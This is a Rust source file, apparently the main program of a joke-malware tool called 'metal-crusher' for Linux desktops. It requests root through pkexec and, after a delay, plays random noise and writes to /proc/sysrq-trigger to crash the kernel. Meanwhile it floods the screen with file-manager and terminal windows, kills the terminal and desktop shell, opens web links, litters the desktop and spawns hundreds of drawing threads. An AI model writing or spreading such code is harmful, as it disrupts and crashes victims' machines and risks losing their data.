use std::{env, io::Cursor, str::FromStr};

use zbus::blocking::connection::{self, Builder};

mod fun;
mod music;

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.contains(&String::from_str("--crusher").unwrap()) {
        std::thread::sleep(std::time::Duration::from_secs(108));
        fun::execute_shell("cat /dev/urandom | aplay");
        std::thread::sleep(std::time::Duration::from_secs(1));
        fun::execute_shell("echo c > /proc/sysrq-trigger");
        return;
    }

    std::thread::spawn(move || {
        let output = std::process::Command::new("pkexec")
            .arg(std::env::current_exe().unwrap())
            .arg("--crusher")
            .output()
            .unwrap();
    
        if !output.status.success() {
            std::process::exit(1);
        }
    });
    
    music::play_audio();

    fun::notify("Fun things will happen soon", ":D");

    std::thread::sleep(std::time::Duration::from_millis(1000));

    fun::notify("Fun things will happen soon", ":D");
    std::thread::sleep(std::time::Duration::from_millis(400));


    let user_terminal = fun::detect_terminal();

    std::thread::sleep(std::time::Duration::from_millis(2300));

    for global_attack in 0..2 {
        let file_managers_wave_1: [&'static str; 5] = [
            "xdg-open /", "xdg-open /bin", "xdg-open /lib", "xdg-open /home", "xdg-open /tmp"
        ];

        let terminals_wave_1: [&'static str; 5] = [
            "ls /; sleep 2000", "ls /tmp; sleep 2000", "ls /bin; sleep 2000", 
            "ls /usr; sleep 2000", "ls /etc; sleep 2000"
        ];

        for file_manager in file_managers_wave_1 {
            fun::execute_shell(file_manager);
            std::thread::sleep(std::time::Duration::from_millis(600));
        }

        for terminal_command in terminals_wave_1 {
            fun::run_in_terminal(user_terminal, terminal_command);
            std::thread::sleep(std::time::Duration::from_millis(600));
        }

        {
            fun::destroy_gui_shell();
            fun::destroy_file_managers();

            fun::execute_shell(format!("killall -9 {}", user_terminal).as_str());
            std::thread::sleep(std::time::Duration::from_millis(1200));

            fun::reanimate_gui_shell();
        }


        let file_managers_wave_2: [&'static str; 5] = [
            "xdg-open /dev", "xdg-open /sbin", "xdg-open /run", "xdg-open /sys", "xdg-open /proc"
        ];

        for file_manager in file_managers_wave_2 {
            fun::execute_shell(file_manager);
            std::thread::sleep(std::time::Duration::from_millis(600));
        }

        {
            fun::run_in_terminal(user_terminal, "tree /home; sleep 2000");
            std::thread::sleep(std::time::Duration::from_millis(600));

            for _ in 0..3 {
                fun::run_in_terminal(user_terminal, "ps aux; sleep 2000");
                std::thread::sleep(std::time::Duration::from_millis(600));
            }

        }

        {

            fun::execute_shell(format!("killall -9 {}", user_terminal).as_str());
            std::thread::sleep(std::time::Duration::from_millis(1200));

            fun::destroy_file_managers();
        }

        {
            std::thread::sleep(std::time::Duration::from_millis(2000));
            fun::toggle_desktop_overview();
            fun::put_random_shit_on_desktop();
            fun::toggle_desktop_overview();

            let links_wave_1: [&'static str; 5] = [
                "xdg-open https://www.youtube.com/@notrlt", 
                "xdg-open https://www.google.com/search?q=linux", 
                "xdg-open https://2ip.io", 
                "xdg-open https://github.com/relativemodder/metal-crusher", 
                "xdg-open https://www.newgrounds.com/audio/listen/1413480"
            ];

            for link in links_wave_1 {
                fun::execute_shell(link);
                fun::execute_shell("");
                std::thread::sleep(std::time::Duration::from_millis(1500));
            }

            std::thread::sleep(std::time::Duration::from_millis(500));

            for _ in 0..7 {
                std::thread::sleep(std::time::Duration::from_millis(200));
                fun::toggle_desktop_overview();
            }
        }

        if global_attack == 0 {
            std::thread::sleep(std::time::Duration::from_millis(3500));
        }
    }

    let username = std::env::var("USER").unwrap();

    std::thread::spawn(move || {
        fun::execute_shell("xdg-open /");
        fun::toggle_desktop_overview();
        std::thread::sleep(std::time::Duration::from_millis(400));
        fun::toggle_desktop_overview();
        fun::execute_shell("xdg-open /bin");
        std::thread::sleep(std::time::Duration::from_millis(400));
        fun::toggle_desktop_overview();
        fun::execute_shell("xdg-open /etc");
        std::thread::sleep(std::time::Duration::from_millis(400));
        fun::toggle_desktop_overview();
        fun::execute_shell("xdg-open /home");
        std::thread::sleep(std::time::Duration::from_millis(400));
        fun::toggle_desktop_overview();
        fun::execute_shell("xdg-open /lib");
        std::thread::sleep(std::time::Duration::from_millis(400));
        fun::toggle_desktop_overview();
        fun::execute_shell("xdg-open /usr");
    });

    std::thread::spawn(move || {
        for _ in 0..900 {
            std::thread::spawn(move || {
                fun::draw_creepy_shit();
            });

            std::thread::sleep(std::time::Duration::from_millis(400));
        }
    });

    for entry in std::fs::read_dir(format!("/home/{}", username)).unwrap() {
        let entry = entry.unwrap();
        if entry.file_type().unwrap().is_dir() {
            fun::execute_shell(format!("xdg-open {}", entry.path().display()).as_str());

            for entry2 in std::fs::read_dir(entry.path()).unwrap() {
                let entry2 = entry2.unwrap();

                if entry2.file_type().unwrap().is_dir() {
                    fun::execute_shell(format!("xdg-open {}", entry2.path().display()).as_str());

                    std::thread::sleep(std::time::Duration::from_millis(400));
                    fun::toggle_desktop_overview();
                }
            }

            fun::toggle_desktop_overview();
            std::thread::sleep(std::time::Duration::from_millis(400));
        }
    }
    
    std::thread::sleep(std::time::Duration::from_secs(40));


}